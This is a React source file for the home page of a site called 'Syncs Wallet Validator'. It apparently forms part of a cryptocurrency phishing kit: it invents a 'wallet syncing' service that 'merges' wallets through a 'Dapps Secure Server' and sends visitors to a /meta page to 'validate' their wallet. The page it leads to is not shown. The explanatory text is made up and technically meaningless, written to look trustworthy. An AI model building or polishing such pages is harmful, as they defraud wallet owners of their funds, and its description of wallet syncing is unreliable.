import reload from "./../assets/walletsync.png";
import banner from "./../assets/banner.png";
import { Link } from "react-router-dom";
import styled from "styled-components";

const Image = styled.img`
  margin-top: 20px;
  margin-bottom: 20px;
`;
const BannerImageContainer = styled.div`
  width: 100%;
  padding: 0 40px;
`;
const BannerImage = styled.img`
  width: 100%;
  padding: 30px;
`;
const Head = styled.h1`
  font-size: 35px;
  font-weight: 500;
  text-align: center;
`;
const Desc = styled.p`
  width: 90%;
  margin-top: 30px;
  margin-bottom: 80px;
  font-size: 30px;
  font-weight: 300;
  text-align: center;
`;
const SubheadingContainer = styled.div`
  padding: 20px 60px;
  font-size: 17px;
  font-weight: 300;
  line-height: 1.35;
  text-align: left;
`;
const Subheading = styled.h2`
font-size: 32px;
    font-weight: 700;
    color: rgb(44, 43, 43);
    margin-bottom: 20px;
}
`;
const SubDescription = styled.p``;
const SubList = styled.ul``;
const SubItem = styled.li``;
const Button = styled.button`
  width: 75%;
  background-color: #07305a;
  color: rgb(252, 250, 255);
  padding: 16px 25px;
  text-align: center;
  border: none;
  border-radius: 10px;
  font-weight: 650;
  outline: none;
  cursor: pointer;
  font-size: 25px;

  &:link,
  &:visited {
    background-color: #07305a;
    color: rgb(252, 250, 255);
    padding: 15px 25px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
  }

  &:hover {
    background-color: rgb(42, 73, 141);
    color: rgb(252, 250, 255);
  }
`;
const Text = styled.h3``;

function Home() {
  return (
    <>
      <center>
        <Image src={reload} alt="reload" />

        <Head>Syncs Wallet Validator</Head>

        <Desc>
          Open protocol for syncing various Wallets to Dapps Secure Server
        </Desc>
        <BannerImageContainer>
          <BannerImage src={banner} alt="banner" />
        </BannerImageContainer>
      </center>

      <SubheadingContainer>
        <Subheading>What is Wallet syncing?</Subheading>
        <SubDescription>
          Wallet Syncing is the process or operation of merging two or more
          wallets at the same time. Syncing is als a method of Re-Authenticating
          an account in other for all tokens in that account to show up in their
          Respective wallets. We also synergize with various ICOs and Exchanges
          to ensure user data is properly stored and safe from cyber criminals.
        </SubDescription>

        <br />
        <br />

        <Subheading>How does Wallet Syncing work?</Subheading>
        <SubDescription>There are three main approaches.</SubDescription>
        <SubList>
          <SubItem>
            Firstly, we assume that the wallet is on a complete Blockchain
            network node.
          </SubItem>
          <SubItem>
            Secondly, wallets are securely connected to Dapps protocol trusted
            server
          </SubItem>
          <SubItem>
            Thirdly, various wallet synced are in direct interaction with the
            rest of the network node which is the most efficient using the
            Simplified Payment Verification (SPV) method. This technique of
            syncing wallets allows a high degree of reliability which is
            currently the syncing method being used on our website.
          </SubItem>
        </SubList>
      </SubheadingContainer>

      <center>
        <Link className="link" to="/meta">
          <Button>Sync Wallet for Validation now</Button>
        </Link>

        <br />
        <br />
        <>
          <Text>
            You can also enable wallet connect for your multiple iOS and Android
            wallets protocol.
          </Text>
          <Button>Connect to walletconnect now</Button>
          <br />
          <br />
        </>
      </center>
    </>
  );
}

export default Home;
